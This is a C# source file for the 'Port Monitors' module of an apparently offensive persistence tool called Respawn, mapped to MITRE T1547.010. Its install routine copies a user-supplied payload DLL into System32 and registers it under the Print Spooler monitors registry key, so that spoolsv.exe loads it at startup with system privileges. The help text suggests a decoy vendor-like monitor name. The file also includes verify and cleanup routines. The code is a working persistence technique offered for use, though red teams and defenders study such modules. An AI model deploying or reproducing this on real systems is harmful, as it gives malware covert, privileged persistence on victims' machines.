using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.PortMonitor
{
    public class PortMonitorModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "port";
        public string Name        => "Port Monitors";
        public string Mitre       => "T1547.010";
        public string Description => "Persist by abusing the Windows Print Spooler service, registering a malicious DLL as a custom Port Monitor in the registry so that it is automatically loaded into spoolsv.exe during system startup.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SYSTEM\CurrentControlSet\Control\Print\Monitors";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Monitor name (e.g. 'HPPortHelper')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t port -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t port -a install -n \"HPPortHelper\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t port -a verify  -n \"HPPortHelper\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t port -a remove  -n \"HPPortHelper\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return PortMonitorKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print\\Monitors registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing != null)
                    return TechniqueResult.Exists($"Port monitor '{ctx.Name}' already registered.");

                // create monitor subkey with Driver value
                using var monitorKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (monitorKey == null)
                    return TechniqueResult.Fail($"Failed to create monitor subkey '{ctx.Name}'.");

                // spoolsv.exe loads DLL from System32 — copy DLL there
                string dllName    = Path.GetFileName(ctx.Payload);
                string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, dllName);

                if (!System.IO.File.Exists(targetPath))
                    System.IO.File.Copy(ctx.Payload, targetPath, overwrite: false);

                // Driver value = just the DLL filename (not full path)
                // spoolsv.exe always loads from System32
                monitorKey.SetValue("Driver", dllName);

                return TechniqueResult.Ok(
                    $"Installed port monitor '{ctx.Name}' | " +
                    $"DLL copied to System32: '{targetPath}' | " +
                    $"Reboot required to load into spoolsv.exe.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Port monitor registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print\\Monitors registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing == null)
                    return TechniqueResult.NotFound($"Port monitor '{ctx.Name}' not found.");

                // get DLL name before deleting
                string? dllName = existing.GetValue("Driver")?.ToString();

                baseKey.DeleteSubKeyTree(ctx.Name);

                // remove DLL from System32
                if (!string.IsNullOrEmpty(dllName))
                {
                    string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    string targetPath = Path.Combine(system32, dllName);
                    if (System.IO.File.Exists(targetPath))
                        System.IO.File.Delete(targetPath);
                }

                return TechniqueResult.Ok($"Removed port monitor '{ctx.Name}' and deleted DLL from System32.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Port monitor registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print\\Monitors registry key. Run as administrator.");

                using var monitorKey = baseKey.OpenSubKey(ctx.Name);
                if (monitorKey == null)
                    return TechniqueResult.NotFound($"Port monitor '{ctx.Name}' not found.");

                string? dllName   = monitorKey.GetValue("Driver")?.ToString();
                string  system32  = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string  dllPath   = Path.Combine(system32, dllName ?? "");
                bool    dllExists = System.IO.File.Exists(dllPath);

                return TechniqueResult.Ok(
                    $"Verified port monitor '{ctx.Name}' | " +
                    $"Driver: '{dllName}' | " +
                    $"DLL in System32: {dllExists}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Port monitor registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No monitor name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "Port monitor requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}